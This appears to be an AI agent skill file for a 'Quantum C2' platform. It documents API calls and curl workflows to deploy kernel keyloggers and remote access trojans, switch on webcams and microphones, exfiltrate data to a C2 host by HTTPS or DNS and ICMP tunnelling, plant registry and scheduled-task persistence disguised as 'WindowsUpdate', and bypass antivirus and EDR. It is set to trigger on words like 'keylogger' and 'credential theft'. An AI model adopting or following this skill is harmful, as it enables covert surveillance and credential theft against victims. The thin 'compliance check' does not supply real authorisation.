---
name: quantum-c2-keylogger-rat-manager
description: >
  Quantum C2 keylogger and RAT manager skill. Use when the user asks about keyloggers, RATs, or surveillance tools. Triggers on: "keylogger", "RAT", "remote access trojan", "surveillance", "data collection", "screenshot", "microphone", "camera", "credential theft".
---

# Quantum C2 Keylogger & RAT Manager

Deploy and manage keyloggers, RATs, and surveillance tools.

## Keylogger Deployment

### Keylogger Types
| Type | Description | Stealth |
|------|-------------|---------|
| `kernel_keylogger` | Kernel-level key logging | High |
| `ui_keylogger` | UI hooking keylogger | Medium |
| `network_keylogger` | Network traffic keylogger | High |
| `clipboard_keylogger` | Clipboard monitoring | Medium |
| `screen_keylogger` | Screenshot-based keylogger | Low |

### Deploy Keylogger
```bash
POST /api/surveillance/keylogger/deploy
{
  "target_id": "sess-abc123",
  "type": "kernel_keylogger",
  "options": {
    "capture_keyboard": true,
    "capture_clipboard": true,
    "capture_screenshots": false,
    "encryption": "aes256",
    "exfiltration_interval_seconds": 60
  }
}
```

### Keylogger Status
```bash
GET /api/surveillance/keylogger/status/{keylogger_id}
```

**Response:**
```json
{
  "keylogger_id": "kl-abc123",
  "target_id": "sess-abc123",
  "type": "kernel_keylogger",
  "status": "active",
  "started_at": "2024-01-15T10:00:00Z",
  "records_captured": 15420,
  "bytes_exfiltrated": 2048576,
  "last_activity": "2024-01-15T10:30:00Z"
}
```

### Get Keylogger Data
```bash
GET /api/surveillance/keylogger/records/{keylogger_id}
GET /api/surveillance/keylogger/records/{keylogger_id}?hours=24
GET /api/surveillance/keylogger/records/{keylogger_id}/export
```

### Control Keylogger
```bash
POST /api/surveillance/keylogger/{id}/start
POST /api/surveillance/keylogger/{id}/stop
POST /api/surveillance/keylogger/{id}/pause
POST /api/surveillance/keylogger/{id}/delete
```

## RAT Configuration

### RAT Types
| Type | Capabilities | Stealth |
|------|-------------|---------|
| `light_rat` | Basic commands, file transfer | High |
| `full_rat` | Full system control, AV evasion | Medium |
| `stealth_rat` | Minimal footprint, long-lived | Very High |
| `modular_rat` | Plugin-based, extensible | Medium |

### Deploy RAT
```bash
POST /api/surveillance/rat/deploy
{
  "target_id": "sess-abc123",
  "type": "full_rat",
  "options": {
    "modules": ["keylogger", "screenshot", "file_transfer", "webcam", "microphone"],
    "evasion": {"av_bypass": true, "edr_bypass": true},
    "persistence": {"method": "registry", "reboot_survives": true},
    "communication": {"c2_channel": "https", "jitter": 0.25}
  }
}
```

### RAT Status
```bash
GET /api/surveillance/rat/status/{rat_id}
```

**Response:**
```json
{
  "rat_id": "rat-abc123",
  "target_id": "sess-abc123",
  "type": "full_rat",
  "status": "active",
  "modules_active": ["keylogger", "screenshot"],
  "uptime_hours": 48,
  "last_checkin": "2024-01-15T10:30:00Z",
  "system_info": {
    "os": "Windows 10",
    "username": "target",
    "hostname": "WORKSTATION-01"
  }
}
```

### RAT Control
```bash
# Execute command
POST /api/surveillance/rat/{id}/command
{"command": "whoami"}

# Take screenshot
POST /api/surveillance/rat/{id}/screenshot

# Activate webcam
POST /api/surveillance/rat/{id}/webcam
{"camera": "front"}

# Activate microphone
POST /api/surveillance/rat/{id}/microphone
{"duration_seconds": 60}

# File operations
POST /api/surveillance/rat/{id}/file/list
{"path": "C:\\Users\\target\\Documents"}

POST /api/surveillance/rat/{id}/file/upload
{"path": "/tmp/payload.exe", "remote_path": "C:\\Users\\target\\Downloads\\payload.exe"}

GET /api/surveillance/rat/{id}/file/download
{"remote_path": "C:\\Users\\target\\Documents\\secrets.docx"}
```

## Surveillance Integration

### Integrated Surveillance
```bash
POST /api/surveillance/combined/deploy
{
  "target_id": "sess-abc123",
  "modules": [
    {"type": "keylogger", "enabled": true},
    {"type": "screenshot", "enabled": true, "interval_seconds": 60},
    {"type": "webcam", "enabled": true},
    {"type": "microphone", "enabled": false},
    {"type": "screen_recording", "enabled": true}
  ]
}
```

### Surveillance Dashboard
```bash
GET /api/surveillance/dashboard/{target_id}
```

**Response:**
```json
{
  "target_id": "sess-abc123",
  "active_modules": ["keylogger", "screenshot", "webcam"],
  "total_records": 45230,
  "storage_used_mb": 128,
  "last_activity": "2024-01-15T10:30:00Z"
}
```

## Data Collection & Exfiltration

### Data Staging
```bash
POST /api/surveillance/data/stage
{
  "source": "keylogger",
  "filter": {"hours": 24, "keywords": ["password", "secret"]},
  "output": "/tmp/staged_data.enc"
}
```

### Exfiltration Methods
| Method | Speed | Stealth | Description |
|--------|-------|---------|-------------|
| `https` | Fast | Medium | HTTPS POST to C2 |
| `dns` | Slow | High | DNS tunneling |
| `icmp` | Slow | High | ICMP tunneling |
| `steganography` | Medium | Very High | Hide in images |
| `encrypted_archive` | Fast | Medium | 7z-AES256 archive |

### Exfiltrate Data
```bash
POST /api/surveillance/data/exfiltrate
{
  "source_path": "/tmp/staged_data.enc",
  "method": "https",
  "destination": "c2.example.com",
  "options": {
    "chunk_size_kb": 64,
    "retry_count": 3,
    "encryption": "aes256"
  }
}
```

### Exfiltration Status
```bash
GET /api/surveillance/data/exfiltrate/status/{exfil_id}
```

## Persistence Mechanisms

### Persistence Types
| Method | Platform | Persistence | Detection |
|--------|----------|-------------|-----------|
| `registry_run` | Windows | High | Medium |
| `scheduled_task` | Windows | High | Medium |
| `service_install` | Windows | Very High | High |
| `startup_folder` | Windows | Medium | Low |
| `wmi_event` | Windows | High | Medium |
| `launchd` | macOS | High | Medium |
| `cron` | Linux | Medium | Low |
| `systemd` | Linux | High | Medium |
| `bootkit` | All | Very High | High |

### Deploy Persistence
```bash
POST /api/surveillance/persistence/deploy
{
  "target_id": "sess-abc123",
  "methods": [
    {"type": "registry_run", "key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "value": "WindowsUpdate"},
    {"type": "scheduled_task", "name": "WindowsUpdate", "trigger": "logon"}
  ]
}
```

### Persistence Status
```bash
GET /api/surveillance/persistence/status/{target_id}
```

## Evasion Techniques

### Evasion Configuration
```bash
POST /api/surveillance/evasion/config
{
  "keylogger": {
    "hide_from_taskmgr": true,
    "hide_from_process_list": true,
    "randomize_input_methods": true,
    "anti_debug": true
  },
  "rat": {
    "av_bypass": true,
    "edr_bypass": true,
    "sandbox_evasion": true,
    "vm_detection": true
  }
}
```

### Evasion Status
```bash
GET /api/surveillance/evasion/status
```

## Legal Compliance Checking

### Compliance Check
```bash
GET /api/surveillance/compliance/check
{
  "jurisdiction": "US",
  "operation_type": "authorized_testing"
}
```

**Response:**
```json
{
  "compliant": true,
  "requirements": [
    {"id": "req-001", "description": "Written authorization required", "status": "met"},
    {"id": "req-002", "description": "Data retention limited to 90 days", "status": "met"},
    {"id": "req-003", "description": "Encryption at rest required", "status": "met"}
  ],
  "warnings": [
    {"id": "warn-001", "description": "International data transfer restrictions may apply"}
  ]
}
```

### Compliance Report
```bash
GET /api/surveillance/compliance/report
```

## API Reference

### Keylogger
```
POST   /api/surveillance/keylogger/deploy
GET    /api/surveillance/keylogger/status/{id}
GET    /api/surveillance/keylogger/records/{id}
GET    /api/surveillance/keylogger/records/{id}/export
POST   /api/surveillance/keylogger/{id}/start
POST   /api/surveillance/keylogger/{id}/stop
POST   /api/surveillance/keylogger/{id}/pause
POST   /api/surveillance/keylogger/{id}/delete
```

### RAT
```
POST   /api/surveillance/rat/deploy
GET    /api/surveillance/rat/status/{id}
POST   /api/surveillance/rat/{id}/command
POST   /api/surveillance/rat/{id}/screenshot
POST   /api/surveillance/rat/{id}/webcam
POST   /api/surveillance/rat/{id}/microphone
POST   /api/surveillance/rat/{id}/file/list
POST   /api/surveillance/rat/{id}/file/upload
GET    /api/surveillance/rat/{id}/file/download
POST   /api/surveillance/rat/{id}/start
POST   /api/surveillance/rat/{id}/stop
POST   /api/surveillance/rat/{id}/delete
```

### Surveillance
```
POST   /api/surveillance/combined/deploy
GET    /api/surveillance/dashboard/{target_id}
```

### Data
```
POST   /api/surveillance/data/stage
POST   /api/surveillance/data/exfiltrate
GET    /api/surveillance/data/exfiltrate/status/{id}
```

### Persistence
```
POST   /api/surveillance/persistence/deploy
GET    /api/surveillance/persistence/status/{target_id}
POST   /api/surveillance/persistence/remove
```

### Evasion
```
POST   /api/surveillance/evasion/config
GET    /api/surveillance/evasion/status
```

### Compliance
```
GET    /api/surveillance/compliance/check
GET    /api/surveillance/compliance/report
```

## Workflows

### Deploy Full Surveillance
```bash
# 1. Deploy keylogger
curl -X POST http://localhost:8000/api/surveillance/keylogger/deploy \
  -H "Content-Type: application/json" \
  -d '{"target_id": "sess-abc123", "type": "kernel_keylogger"}'

# 2. Deploy RAT with full capabilities
curl -X POST http://localhost:8000/api/surveillance/rat/deploy \
  -H "Content-Type: application/json" \
  -d '{"target_id": "sess-abc123", "type": "full_rat", "options": {"modules": ["keylogger", "screenshot", "webcam", "microphone"]}}'

# 3. Check compliance
curl http://localhost:8000/api/surveillance/compliance/check

# 4. Monitor dashboard
curl http://localhost:8000/api/surveillance/dashboard/sess-abc123
```

### Quick Keylogger Deployment
```bash
# Deploy keylogger only
curl -X POST http://localhost:8000/api/surveillance/keylogger/deploy \
  -H "Content-Type: application/json" \
  -d '{"target_id": "sess-abc123", "type": "ui_keylogger", "options": {"capture_keyboard": true, "capture_clipboard": true}}'

# Get records after 24 hours
curl http://localhost:8000/api/surveillance/keylogger/records/kl-001?hours=24
```

## Best Practices

1. **Check compliance first** — Ensure legal authorization
2. **Minimize footprint** — Use light RAT when possible
3. **Encrypt data** — Always encrypt collected data
4. **Rotate channels** — Change C2 channels regularly
5. **Use evasion** — Enable anti-detection features
6. **Clean up after** — Remove all persistence mechanisms
7. **Log operations** — Document all surveillance activities
8. **Limit data retention** — Delete data when no longer needed

## Troubleshooting

### Keylogger Not Capturing
```bash
# Check keylogger status
curl http://localhost:8000/api/surveillance/keylogger/status/kl-001

# Restart keylogger
curl -X POST http://localhost:8000/api/surveillance/keylogger/kl-001/start
```

### RAT Disconnected
```bash
# Check RAT status
curl http://localhost:8000/api/surveillance/rat/status/rat-001

# Re-establish connection
curl -X POST http://localhost:8000/api/surveillance/rat/rat-001/start
```

### Data Exfiltration Failing
```bash
# Check exfiltration status
curl http://localhost:8000/api/surveillance/data/exfiltrate/status/exfil-001

# Try different method
curl -X POST http://localhost:8000/api/surveillance/data/exfiltrate \
  -d '{"method": "dns", "source_path": "/tmp/data.enc"}'
```
